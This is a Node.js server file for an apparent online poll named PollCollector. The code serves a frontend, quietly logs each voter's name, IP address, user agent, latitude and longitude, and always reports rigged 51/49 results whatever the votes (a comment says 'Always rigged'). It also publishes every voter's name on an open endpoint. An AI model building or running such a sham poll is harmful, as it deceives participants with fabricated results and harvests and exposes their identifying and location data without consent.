// server.js
const http = require('http'),
      fs   = require('fs'),
      path = require('path'),
      url  = require('url');

const voters = []; // in-memory log of submissions

function serveStatic(file, res) {
  fs.readFile(path.join(__dirname, file), (e, data) => {
    if (e) { res.writeHead(404); return res.end("404 Not Found"); }
    const ext = path.extname(file);
    const ct = {
      '.html':'text/html',
      '.css':'text/css',
      '.js':'application/javascript',
      '.json':'application/json'
    }[ext] || 'text/plain';
    res.writeHead(200, {'Content-Type': ct});
    res.end(data);
  });
}

function parseJSON(req, cb) {
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    try { cb(null, JSON.parse(body)); }
    catch (err) { cb(err); }
  });
}

const server = http.createServer((req, res) => {
  const p = url.parse(req.url).pathname;
  // Serve frontend
  if (req.method==='GET' && (p==='/'||p==='/index.html'))
    return serveStatic('public/index.html', res);
  if (req.method==='GET' && p==='/style.css')
    return serveStatic('public/style.css', res);

  // Handle vote submission
  if (req.method==='POST' && p==='/submit') {
    return parseJSON(req, (err, body) => {
      if (err || !body.name || !body.choice) {
        res.writeHead(400);
        return res.end('Invalid submission');
      }
      // Collect IP
      const ip = req.headers['x-forwarded-for']?.split(',')[0] 
                 || req.socket.remoteAddress || '';
      const ua = req.headers['user-agent'] || '';
      const timestamp = new Date().toISOString();

      // Build record of data points, including GPS
      const record = {
        name: body.name,
        choice: body.choice,
        ip,
        userAgent: ua,
        lat: body.lat,
        lon: body.lon,
        timestamp
      };
      voters.push(record);
      console.log('Logged vote:', record);

      // Always rigged 51/49
      res.writeHead(200, {'Content-Type':'application/json'});
      return res.end(JSON.stringify({
        hitPercent: 51,
        hvtPercent: 49,
        voters: voters.map(v=>v.name)
      }));
    });
  }

  // Return list of voters
  if (req.method==='GET' && p==='/voters') {
    res.writeHead(200, {'Content-Type':'application/json'});
    return res.end(JSON.stringify({ voters: voters.map(v=>v.name) }));
  }

  // 404
  res.writeHead(404);
  res.end('Not found');
});

const PORT = process.env.PORT||3000;
server.listen(PORT, () =>
  console.log(`PollCollector listening on http://localhost:${PORT}`)
);